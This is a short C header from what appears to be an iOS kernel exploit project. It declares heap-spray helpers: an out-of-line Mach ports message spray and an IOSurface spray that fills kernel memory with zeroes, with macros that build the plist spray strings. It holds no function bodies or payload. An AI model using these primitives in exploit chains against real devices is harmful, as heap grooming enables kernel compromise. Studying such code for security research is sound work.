#ifndef SPRAY_H
#define SPRAY_H

#include <mach/mach.h>

// For OOL_PORTS_DESCRIPTOR heap spray
#define SPRAYS 1

// For IOSurface heap spray
#define NULL_BYTE_HEX "00"
#define CHUNK_SPRAY_SIZE 0x800
#define N_OSDATA_SPRAY 0x4

#define CREATE_SPRAY_DATA(X, Y)			\
    sprintf(X, "%s%s%s",			\
        "<data>",		\
        Y,  				\
        "</data>\n");

#define BEGIN_SPRAY_STRING(X) \
    sprintf(X, "%s%s",	      \
        "<array>\n",      \
        "<array>\n");

#define APPEND_SPRAY_STRING_END(X, Y)		\
    strcat(X, "</array>\n");	   \
    strcat(X, "<string>");	   \
    strcat(X, Y);		   \
    strcat(X, "</string>\n");	   \
    strcat(X, "</array>\n");

struct ool_ports_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[];
};

typedef struct ool_ports_msg * ool_ports_msg_t;

int ool_ports_descriptor_spray(mach_port_t receive_port, size_t message_count, mach_port_t *ports, size_t ports_count);
int spray_kernel_heap_with_zeroes(io_connect_t *connection, uint32_t *surface_id, char *key);

#endif